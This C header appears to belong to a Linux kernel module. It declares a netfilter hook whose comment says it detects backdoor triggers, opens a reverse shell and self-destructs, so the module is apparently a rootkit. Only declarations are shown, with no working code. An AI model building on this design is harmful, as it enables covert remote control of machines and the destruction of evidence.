#ifndef HEADER_NETFILTER_MANAGER
#define HEADER_NETFILTER_MANAGER

#include <linux/kernel.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/module.h>
#include <linux/version.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/kthread.h>
#include <linux/delay.h>




/**
 * @brief Netfilter hook for handling incoming packets.
 *
 * This function serves as a Netfilter hook to inspect incoming packets and
 * perform specific actions based on packet content. It is designed to
 * detect backdoor triggers, initiate a reverse shell, and trigger self-destruct
 * functionality.
 *
 * @param priv The private data associated with the Netfilter hook (unused).
 * @param skb  The socket buffer containing the incoming packet.
 * @param state The Netfilter hook state information.
 *
 * @return NF_ACCEPT if the packet is allowed, NF_DROP if the packet is dropped.
 */
unsigned int net_hook(void *priv, struct sk_buff *skb, const struct nf_hook_state *state);


int register_netfilter_hook(void);
void unregister_netfilter_hook(void);






#endif